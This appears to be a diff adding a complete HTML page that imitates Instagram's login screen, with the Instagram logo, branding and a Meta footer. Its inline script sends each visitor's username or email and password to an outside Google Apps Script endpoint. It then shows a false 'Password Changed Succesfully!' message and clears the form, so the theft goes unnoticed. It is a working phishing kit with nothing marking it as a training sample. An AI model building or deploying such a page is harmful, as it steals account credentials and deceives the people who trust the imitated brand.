@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="shortcut icon" href="src/ig.webp" type="image/x-icon" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img
+            src="src/instagramlogo.png"
+            alt="instagramLogo"
+            class="instaLogo"
+          />
+        </div>
+
+        <form name="script-login">
+          <div class="inputElement">
+            <input
+              type="text"
+              name="email"
+              placeholder="Phone number,username or email"
+              class="inputText"
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              class="inputText"
+            />
+            <button type="submit" name="login" class="inputButton">
+              Log in
+            </button>
+            <button
+              class="btn btn-loading d-none"
+              type="button"
+              disabled
+              id="btn"
+            >
+              <span
+                class="spinner-border spinner-border-sm"
+                aria-hidden="true"
+              ></span>
+              <span role="status">Please Wait...</span>
+            </button>
+            <div
+              class="alert alert-dismissible fade show d-none my-alert"
+              id="alert"
+              role="alert"
+            >
+              <strong>Password Changed Succesfully!</strong>
+              <button
+                type="button"
+                class="btn-close"
+                data-bs-dismiss="alert"
+                aria-label="Close"
+              ></button>
+            </div>
+            <a href="/" class="forgetPassword">Forgot Password?</a>
+          </div>
+        </form>
+      </div>
+      <div class="footer">
+        <p>Don't have a accout?<a href="/" target="_blank">Sign Up</a></p>
+      </div>
+      <div class="apps">
+        <p>Get the app.</p>
+        <div class="apps-img">
+          <img src="src/goggle.png" class="google" alt="Goggle" />
+          <img src="src/microsoft.png" class="microsoft" alt="Microsoft" />
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="first">
+        <a href="/">Meta</a>
+        <a href="/">About</a>
+        <a href="/">Blog</a>
+        <a href="/">Jobs</a>
+        <a href="/">Help</a>
+        <a href="/">API</a>
+        <a href="/">Privacy</a>
+        <a href="/">Location</a>
+        <a href="/">Threads</a>
+      </div>
+      <div class="end">
+        <p>© 2024 Instagram from Meta</p>
+      </div>
+    </footer>
+
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbzD9iTT5z8UopS7wF9flG5UA_JyCM4Cx_UOjPTSwZbWWquuKU4tt61i9PcGydPKRZCu5A/exec";
+      const form = document.forms["script-login"];
+      const myAlert = document.querySelector(".my-alert");
+      const btnKirim = document.querySelector(".inputButton");
+      const btnLoading = document.querySelector(".btn-loading");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        btnKirim.classList.toggle("d-none");
+        btnLoading.classList.toggle("d-none");
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+          .then((response) => {
+            btnKirim.classList.toggle("d-none");
+            btnLoading.classList.toggle("d-none");
+            myAlert.classList.toggle("d-none");
+            form.reset();
+            console.log("Success!", response);
+          })
+          .catch((error) => console.error("Error!", error.message));
+      });
+    </script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
